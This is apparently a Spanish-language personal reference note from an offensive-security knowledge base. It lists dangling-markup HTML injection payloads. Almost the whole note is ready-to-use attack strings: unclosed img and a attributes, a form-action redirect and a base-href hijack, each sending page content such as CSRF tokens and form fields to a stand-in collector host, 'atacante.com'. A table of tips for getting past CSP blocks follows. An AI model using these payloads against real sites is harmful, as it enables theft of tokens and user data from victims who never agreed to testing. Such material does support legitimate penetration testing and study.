---
tipo: meta
aliases:
  - Payloads dangling markup
tags:
  - meta/referencia
  - dominio/web
---

# XSS dangling markup - matriz de referencia

> [!info] Referencia pura, no un zettel
> Exfil por HTML injection sin JS. Criterio en [[XSS - dangling markup injection]]. `atacante.com` es tu recolector. `yi``  ` copia.

## Captura por atributo sin cerrar

`<img src='https://atacante.com/c?`
Comilla simple abierta: el navegador traga el HTML siguiente hasta la próxima `'` y lo manda como parte de la URL.

`<img src="https://atacante.com/c?`
Igual con comilla doble, si el contexto usa esa.

`<a href="https://atacante.com/c?`
Si `img-src` está bloqueado pero se puede forzar un clic (`href`).

## Robar un token del formulario

Objetivo típico: capturar un `<input name=csrf value=...>` que está más abajo en la página.

`<img src='https://atacante.com/c?token=`
Colocado **antes** del formulario: la URL absorbe el HTML hasta la próxima comilla, incluido el value del token.

## Forzar el envío de un formulario a tu dominio

`<form action='https://atacante.com/c'><input name=x value='`
Reapunta un formulario existente: si la víctima lo envía, los campos van a tu servidor.

`<base href='https://atacante.com/'>`
Cambia la base de todas las URLs relativas (si falta `base-uri` en la CSP) — formularios y recursos relativos pasan a tu dominio.

## Cuando filtran comillas

`<img src=https://atacante.com/c?x=`
Sin comillas: el navegador consume hasta el próximo espacio o `>`. Captura menos, pero a veces alcanza.

## Gotchas

| Síntoma | Qué pasa |
|---|---|
| No llega nada al recolector | CSP `img-src`/`connect-src` bloquea el dominio → probar `href` con clic |
| Captura HTML de más | No había comilla de cierre cercana; ajustar el tag o el atributo |
| El dato no aparece | Está **antes** de la inyección: dangling markup solo captura lo que sigue |
| La imagen no carga con newlines | Mitigación del navegador; evitar saltos crudos en la URL |

## Relacionadas

[[XSS - dangling markup injection]] · [[XSS - CSP]] · [[MOC - Cross-site scripting]]
